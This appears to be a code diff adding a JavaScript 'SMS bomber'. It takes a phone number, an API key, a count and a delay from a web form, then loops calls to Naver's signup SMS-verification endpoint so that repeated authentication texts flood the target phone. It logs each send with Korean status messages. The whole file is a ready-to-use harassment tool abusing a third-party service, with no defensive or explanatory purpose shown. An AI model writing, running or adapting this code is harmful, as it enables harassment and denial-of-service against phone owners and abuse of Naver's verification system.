@@ -1,0 +1,28 @@
+const NaverApi = document.getElementById("SMSapi");
+const SMSmain = document.getElementById("PhoneNumber");
+const loop = document.getElementById("SendTime");
+const SetDelay = document.getElementById("SendDelay");
+async function SendSMS() {
+	let formData = new FormData();
+	if (!loop.value || !SMSmain.value || !SetDelay.value || !NaverApi.value) {
+		alert("빈칸을 채워주세요!");
+	} else {
+		if (SetDelay <= 0) {
+			alert("최소 딜레이는 1초입니다!");
+		} else {
+
+			SendLog();
+			document.write("(전화번호 : " + SMSmain.value + ", API : " + NaverApi.value + ", 보낼 수 : " + loop.value + ", 딜레이 : " + SetDelay.value + "초 ) " + "</br>" + "</br>");
+			for (let i = 0; i < loop.value; i++) {
+				fetch("https://nid.naver.com/user2/joinAjax?m=sendAuthno&nationNo=82&mobno=" + SMSmain.value + "&lang=en_US&key=" + NaverApi.value + "", {
+					mode: "no-cors",
+				});
+				document.write(i + 1 + "개 전송완료! " + "(전화번호 : " + SMSmain.value + ", API : " + NaverApi.value + ", 보낼 수 : " + loop.value + ")" + "</br>");
+				await sleep(SetDelay.value * 1000);
+			}
+			document.write(loop.value + "개 전송을 완료 하였습니다!" + "</br>");
+			document.write("<button onclick=" + "window.location.reload()" + "> 돌아가기 </button>");
+		}
+	}
+
+};
